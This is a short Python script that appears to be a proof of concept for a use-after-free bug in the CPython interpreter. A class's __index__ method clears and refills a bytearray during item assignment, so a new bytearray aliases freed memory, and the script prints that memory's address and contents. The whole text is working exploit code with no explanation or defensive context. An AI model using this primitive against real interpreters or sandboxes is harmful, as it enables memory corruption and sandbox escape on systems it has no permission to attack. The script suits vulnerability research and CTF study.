class B:
    def __index__(self):
        global memory
        uaf.clear()
        memory = bytearray()
        uaf.extend([0] * 56)
        return 0

uaf = bytearray(56)
uaf[0] = B()
print(hex(id(memory)))
print(memory,memory[::-1])
input('...')
